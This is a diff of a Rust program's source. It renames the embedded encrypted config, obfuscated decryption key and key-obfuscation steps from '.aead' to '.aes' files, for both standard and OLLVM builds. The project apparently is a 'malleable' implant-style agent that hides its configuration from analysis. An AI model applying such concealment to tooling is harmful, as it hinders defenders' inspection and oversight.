@@ -20,24 +20,24 @@ use cryptify;
 // ------ STANDARD compilation
 #[rustfmt::skip]
 #[cfg(not(feature="ollvm"))]
-const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead"));
+const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes"));
 #[rustfmt::skip]
 #[cfg(not(feature="ollvm"))]
-const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead.dataop.obfuscated"));
+const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes.dataop.obfuscated"));
 #[rustfmt::skip]
 #[cfg(not(feature="ollvm"))]
-const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aead.dataop.obfuscated.dataop"));
+const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/initial.json.encrypted.aes.dataop.obfuscated.dataop"));
 
 // ------ OLLVM compilation from docker
 #[rustfmt::skip]
 #[cfg(feature="ollvm")]
-const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead");
+const INITIAL_CONFIG_ENCRYPTED : &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes");
 #[rustfmt::skip]
 #[cfg(feature="ollvm")]
-const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead.dataop.obfuscated");
+const OBFUSCATED_CONFIG_DECRYPT_KEY: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated");
 #[rustfmt::skip]
 #[cfg(feature="ollvm")]
-const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aead.dataop.obfuscated.dataop");
+const DECRYPT_KEY_OBFUSCATION_STEPS: &[u8] = include_bytes!("/projects/config/initial.json.encrypted.aes.dataop.obfuscated.dataop");
 
 fn main() {
     #[cfg(feature = "logdebug")]
